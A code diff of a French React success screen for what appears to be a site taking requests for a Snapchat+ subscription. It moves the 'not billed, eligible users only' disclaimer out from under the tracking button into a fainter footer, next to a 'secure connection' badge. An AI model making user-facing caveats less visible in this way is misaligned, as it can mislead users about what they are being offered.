@@ -113,18 +113,12 @@ export default function SuccessScreen({ data, adminInactive }) {
         {/* Lien de suivi */}
         <a
           href={`/suivi?id=${typeof sessionStorage !== "undefined" ? sessionStorage.getItem("submissionId") || "" : ""}`}
-          className="block w-full bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 mb-3 text-center hover:bg-primary/20 transition-colors"
+          className="block w-full bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 mb-6 text-center hover:bg-primary/20 transition-colors"
         >
           <span className="flex items-center justify-center gap-2 text-primary text-sm font-semibold">
             <ArrowRight className="w-4 h-4" /> Suivre ma demande en temps réel
           </span>
         </a>
-
-        {/* Disclaimer sous le bouton */}
-        <p className="text-muted-foreground/50 text-xs leading-relaxed mb-6">
-          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
-          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
-        </p>
 
         {/* Contact */}
         <p className="text-muted-foreground text-xs mb-8 leading-relaxed">
@@ -135,6 +129,12 @@ export default function SuccessScreen({ data, adminInactive }) {
         {/* Security */}
         <p className="text-muted-foreground/50 text-xs mb-4">
           🔒 Connexion sécurisée • Données protégées
+        </p>
+
+        {/* Footer */}
+        <p className="text-muted-foreground/40 text-xs leading-relaxed">
+          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
+          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
       </div>
     </motion.div>);
